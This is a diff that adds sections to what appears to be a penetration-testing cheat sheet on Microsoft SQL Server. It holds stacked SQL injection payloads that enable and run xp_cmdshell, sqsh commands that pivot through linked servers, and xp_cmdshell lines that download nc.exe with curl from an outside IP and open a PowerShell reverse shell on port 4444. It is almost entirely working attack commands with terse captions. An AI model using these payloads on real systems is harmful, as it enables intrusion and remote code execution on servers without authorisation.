@@ -121,3 +121,39 @@ neo4j console
 >localhost:7474 neo4j:neo4j
 
 ```
+
+# MSSQL - xp_cmdshell
+```
+123' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1-- -
+123' UNION SELECT 1,2,3,4,5; RECONFIGURE-- -
+123' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1-- -
+123' UNION SELECT 1,2,3,4,5; RECONFIGURE-- -
+123' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping 192.168.xx.xx'-- -
+```
+# MSSQL - sqsh and linked sql servers.
+```
+sqsh -S IP -U username -P password -D dbname
+> Connect
+
+EXEC sp_linkedservers;
+go
+> List linked servers.
+
+select version from openquery("SQL27", 'select @@version as version')
+go
+> Find version of a linked server.
+
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL27;
+go
+EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL27;
+go
+EXEC ('reconfigure;') AT SQL27;
+go
+> Allow xp_cmdshell on a linked server remotely.
+
+EXEC ('xp_cmdshell "curl http://192.168.45.172/nc.exe -o nc.exe ; nc.exe -e powershell 192.168.45.172 4444";') AT SQL27;
+> Download nc for reverse shell on a linked server.
+
+EXEC ('xp_cmdshell "nc.exe -e powershell 192.168.45.172 4444";') AT SQL27;
+> Get a reverse shell after download. Don't forget to listen the port.
+```
